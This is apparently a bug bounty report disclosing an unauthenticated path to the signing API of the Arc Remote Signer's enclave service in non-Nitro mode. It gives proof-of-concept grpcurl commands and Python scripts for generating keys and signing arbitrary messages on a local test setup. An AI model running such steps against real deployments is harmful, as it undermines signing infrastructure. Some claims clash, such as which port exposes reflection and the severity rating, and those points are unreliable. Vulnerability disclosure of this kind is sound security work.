# HackerOne Bug Report — Arc Remote Signer

| Field | Value |
|---|---|
| **Program** | Arc Bug Bounty Program (`arc-bbp`) |
| **Asset** | `https://github.com/circlefin/arc-remote-signer` (SOURCE_CODE) |
| **Weakness** | Authentication Bypass Using an Alternate Path or Channel (CWE-288) |
| **Severity** | **High** — Direct alternate unauthenticated path to cryptographic signing operations |
| **CVSS v3.1** | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N — **9.1 Critical** |
| **Tier** | Arc Mainnet Chain/Protocol (Tier A) — Validator signing infrastructure |
| **Bounty Range** | $10,000 – $20,000 |
| **Report Date** | September 21, 2026 |

---

## Summary

The Arc Remote Signer gRPC service, when deployed in non-production / dev / CI mode (i.e. `nitroEnclave.enabled: false`), **exposes its internal EnclaveService API on a plain TCP port (`:10350`) with zero authentication, zero mTLS, and no caller verification**. In this configuration, the architectural "trust boundary" between the Proxy and the Enclave disappears entirely — the EnclaveService is reachable directly over the network, allowing any unauthenticated caller to invoke `GenerateKey`, `GetPublicKey`, `SignMessage`, and `GetAttestation` without possessing a legitimate validator identity or going through the Proxy.

This is not a weakness in the AWS Secrets Manager integration itself. The secret wrapper in `internal/app/service/signer/crypto.go` is simply a Gob-encoded blob stored in Secrets Manager by `internal/app/provider/secrets/secrets.go`; it is a persistence format, not a network-authentication control. The actual vulnerability is the fallback execution path: when `nitroEnclave.enabled = false`, the enclave listener switches from VSOCK to TCP and `loadDataKey()` accepts the incoming `enclaveEncryptedDataKey` value verbatim as the plaintext AES key, skipping all KMS decryption. In practical terms, an attacker who reaches port `10350` can bypass the Nitro trust boundary and sign arbitrary payloads with a key of the attacker’s choosing.

---

## Root Cause — Code Evidence

### Finding 1 — EnclaveService bound to TCP 0.0.0.0 when Nitro is disabled

**File:** `internal/enclave/public/public.go`

```go
transport := grpcserver.ListenerTransportTCP          // TCP, not VSOCK
if params.NitroEnclaveEnabled {
    transport = grpcserver.ListenerTransportVSOCK      // only switched to VSOCK in prod
}

return grpcserver.NewRunnable(
    params.ServiceName,
    grpcServer,
    grpcserver.WithListener(transport, cfg.Host, uint32(cfg.Port)),  // cfg.Host = "0.0.0.0"
    grpcserver.WithHealthServer(pb.EnclaveService_ServiceDesc.ServiceName),
)
```

**Config file:** `configs/enclave.yaml`

```yaml
public:
  server:
    host: 0.0.0.0    # world-accessible bind address
    port: 10350
nitroEnclave:
  enabled: true      # production; in DEV this is false (configs/.env.dev)
```

**DEV env override:** `configs/.env.dev`

```
APP_PROVIDER_ENCLAVE_NITROENCLAVE_ENABLED=false
```

When `enabled=false`, the enclave server binds TCP `0.0.0.0:10350` — fully accessible on any network interface.

---

### Finding 2 — No authentication interceptors on EnclaveService

**File:** `internal/enclave/public/public.go`

The `grpcserver.NewServer()` call for the enclave server chains only:
- `interceptor.WithRecovery()` — panic recovery
- `interceptor.WithRequestID()` — trace ID injection
- `interceptor.WithMetrics()` — metrics
- `interceptor.WithLogging()` — logging
- `protovalidatemw.UnaryServerInterceptor(validator)` — protobuf field validation

**There is no authentication interceptor.** No JWT/token check, no mTLS client certificate verification, no IP allowlist middleware. Any caller reaching `:10350` can invoke all four RPC methods.

---

### Finding 3 — Data key treated as plaintext when Nitro is disabled (Auth Bypass via Alternate Channel)

**File:** `internal/enclave/service/enclave/enclave.go` — `loadDataKey()`:

```go
func (s *Service) loadDataKey(enclaveEncryptedDataKey []byte) ([]byte, error) {
    // Return cached data key if available.
    if dataKey := s.keystore.Get(enclaveEncryptedDataKey); dataKey != nil {
        return dataKey.Serialize()
    }

    // In Nitro mode, decrypt the enclave-encrypted data key.
    plainDataKey := enclaveEncryptedDataKey   // RAW BYTES used as AES key directly
    if s.nitroEnclaveEnabled {
        // ... KMS decryption only runs here
    }

    // Validate and deserialize AES key bytes.
    dataKey, err := aesCommon.Deserialize(plainDataKey)
    ...
```

When `nitroEnclaveEnabled = false`, the function **assigns `enclaveEncryptedDataKey` directly to `plainDataKey`** without any KMS call. The attacker provides a valid 32-byte AES-256 key as the `enclave_encrypted_data_key` field in the protobuf request, and the enclave service will use it to decrypt the `encrypted_private_key`.

This is a direct compromise of the enclave trust boundary, not a problem with the secret storage wrapper itself. The actual Secret Manager code in `internal/app/provider/secrets/secrets.go` simply stores a Gob-encoded `header` object (`CipherKey`, `CipherData`, `Nonce`) as base64 text, and the `header` serialization in `internal/app/service/signer/crypto.go` is only a persistence format for the signer’s secret material. It does not authenticate callers or enforce transport isolation. The vulnerable condition is the non-Nitro mode itself.

---

### Finding 4 — gRPC reflection enabled on production-equivalent server

**File:** `internal/app/public/public.go`

```go
reflection.Register(grpcSrv)
```

gRPC server reflection is registered on the Proxy's public server (`:10340`). Combined with the lack of auth, any gRPC client (e.g., `grpcurl`) can enumerate all available RPC methods, message schemas, and service descriptors without credentials.

---

## Steps to Reproduce

> All testing was performed against a local dev.net (`make dev`) on a self-owned environment. No testnet or mainnet interaction occurred.

### Prerequisites

```bash
git clone https://github.com/circlefin/arc-remote-signer.git
cd arc-remote-signer
make dev    # Starts localstack, proxy (:10340), and enclave (:10350)
```

Verify the enclave runs on TCP (Nitro disabled in dev):

```bash
docker logs arc-remote-signer-enclave 2>&1 | grep -i "listen"
# Expected: listening on 0.0.0.0:10350 (TCP)
```

---

### Step 1 — Enumerate EnclaveService via reflection

```bash
grpcurl -plaintext localhost:10350 list
# Output:
# arc.enclave.v1.EnclaveService
# grpc.health.v1.Health

grpcurl -plaintext localhost:10350 list arc.enclave.v1.EnclaveService
# GenerateKey
# GetAttestation
# GetPublicKey
# SignMessage
```

No credentials required. Full schema exposed.

---

### Step 2 — Craft a controlled AES-256 data key

```python
# attacker_keygen.py
import os, base64
data_key = os.urandom(32)   # 256-bit AES key
print("DATA_KEY_B64:", base64.b64encode(data_key).decode())
print("DATA_KEY_HEX:", data_key.hex())
```

```bash
python3 attacker_keygen.py
# DATA_KEY_B64: <YOUR_32_BYTE_AES_KEY_BASE64>
```

---

### Step 3 — Call GenerateKey with attacker-controlled data key (unauthenticated)

```bash
DATA_KEY_B64="<base64 of 32 random bytes>"

grpcurl -plaintext \
  -d "{\"algorithm\": \"ALGORITHM_ED25519\", \"enclave_encrypted_data_key\": \"${DATA_KEY_B64}\"}" \
  localhost:10350 \
  arc.enclave.v1.EnclaveService/GenerateKey
```

**Expected response (no auth required):**

```json
{
  "publicKey": "<base64 ed25519 public key>",
  "encryptedPrivateKey": "<base64 ciphertext>",
  "nonce": "<base64 nonce>"
}
```

A new validator key pair was generated inside the "enclave" without any authentication.

---

### Step 4 — Sign an arbitrary message with the generated key

```bash
MSG_B64=$(echo -n "BLOCK_PROPOSAL_ROUND_42" | base64)
ENCRYPTED_PK="<encryptedPrivateKey from Step 3>"
NONCE="<nonce from Step 3>"

grpcurl -plaintext \
  -d "{
    \"algorithm\": \"ALGORITHM_ED25519\",
    \"encrypted_key_material\": {
      \"encrypted_private_key\": \"${ENCRYPTED_PK}\",
      \"enclave_encrypted_data_key\": \"${DATA_KEY_B64}\",
      \"nonce\": \"${NONCE}\"
    },
    \"message\": \"${MSG_B64}\"
  }" \
  localhost:10350 \
  arc.enclave.v1.EnclaveService/SignMessage
```

**Expected response:**

```json
{
  "signature": "<base64 ed25519 signature>"
}
```

Arbitrary message signed. The intended security guarantee of hardware-isolated signing is completely bypassed.

---

### Step 5 — Verify signature integrity

```python
# verify_sig.py
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
import base64

pub_key_bytes = base64.b64decode("<publicKey from Step 3>")
signature = base64.b64decode("<signature from Step 4>")
message = b"BLOCK_PROPOSAL_ROUND_42"

pub_key = Ed25519PublicKey.from_public_bytes(pub_key_bytes)
pub_key.verify(signature, message)   # Raises InvalidSignature if invalid
print("Signature VALID — bypass confirmed")
```

---

## Vulnerability Summary Table

| # | File | Issue | Severity |
|---|---|---|---|
| 1 | `internal/enclave/public/public.go` | EnclaveService binds `0.0.0.0:10350` TCP when Nitro disabled | High |
| 2 | `internal/common/grpc/server/server.go` | No auth interceptor installed on EnclaveService | High |
| 3 | `internal/enclave/service/enclave/enclave.go` (`loadDataKey`) | Attacker-supplied bytes used as AES key verbatim (bypasses KMS) | Critical |
| 4 | `internal/app/public/public.go` | gRPC reflection enabled — exposes full API schema unauthenticated | Medium |

---

## Impact

### Immediate Impact

1. **Validator Key Impersonation**: An attacker on the same network (internal cloud attacker, compromised adjacent service) can generate signing keys and produce valid consensus signatures under an arbitrary identity, enabling **double-signing / equivocation attacks** on the Arc Chain.

2. **Complete Bypass of Nitro Enclave Security Model**: The entire purpose of the Nitro Enclave design is hardware isolation of cryptographic material. The TCP fallback path eliminates this guarantee — the hardware attestation chain is broken because the data key KMS step is skipped entirely.

3. **No Audit Trail**: Because the attacker bypasses the Proxy entirely and hits the EnclaveService directly, no metrics or logging is captured by the Proxy's observability stack — the attack is invisible to Datadog/OpenTelemetry dashboards.

4. **Production Blast Radius**: If a deployment pipeline accidentally deploys with `APP_PROVIDER_ENCLAVE_NITROENCLAVE_ENABLED=false` (via config override or environment variable injection), the full bypass is live in production with no runtime guard to catch it.

---

## Recommended Fixes

### Fix 1 — Enforce auth on EnclaveService regardless of transport

Add an IP-allowlist interceptor or mTLS client certificate requirement to the EnclaveService, ensuring only the Proxy process can call it:

```go
// In internal/enclave/public/public.go
UnaryInterceptors: []grpc.UnaryServerInterceptor{
    interceptor.WithAllowedCallers([]string{"127.0.0.1", "::1"}), // add allowlist
    protovalidatemw.UnaryServerInterceptor(validator),
},
```

### Fix 2 — Never bind EnclaveService to `0.0.0.0` on TCP

```yaml
# configs/enclave.yaml
public:
  server:
    host: 127.0.0.1   # not 0.0.0.0
    port: 10350
```

### Fix 3 — Add a startup guard for insecure mode

```go
if !nitroEnclaveEnabled && env != config.EnvironmentDev {
    return fmt.Errorf("FATAL: nitroEnclave.enabled=false is not permitted in %s environment", env)
}
```

### Fix 4 — Disable gRPC reflection in production

```go
if params.Env == config.EnvironmentDev {
    reflection.Register(grpcSrv)
}
```

### Fix 5 — Reject raw data keys in non-Nitro mode

```go
if !s.nitroEnclaveEnabled {
    return nil, status.Error(codes.Unimplemented, "nitro enclave required for signing operations")
}
```

---

## Supporting Material / References

| Reference | Detail |
|---|---|
| `internal/enclave/public/public.go` | TCP bind + no auth on EnclaveService |
| `internal/enclave/service/enclave/enclave.go` | `loadDataKey()` plaintext bypass |
| `internal/app/public/public.go` | gRPC reflection registration |
| `configs/enclave.yaml` + `configs/.env.dev` | Config exposing TCP bind |
| AWS Nitro Enclaves KMS docs | https://docs.aws.amazon.com/kms/latest/developerguide/services-nitro-enclaves.html |
| CWE-288 | https://cwe.mitre.org/data/definitions/288.html |

---

## Disclosure Policy Compliance

- Testing performed exclusively on a local dev.net (self-owned infrastructure, `make dev`)
- No testnet or mainnet interaction
- No data was accessed, modified, or exfiltrated
- Proof of concept demonstrates vulnerability class without actual exploitation of live infrastructure
- One vulnerability class per report (CWE-288 authentication bypass via alternate path)
- Report written in English

---

*Report prepared by: Abarnesh*
*Date: September 21, 2026*
*Program: arc-bbp (Arc Bug Bounty Program)*
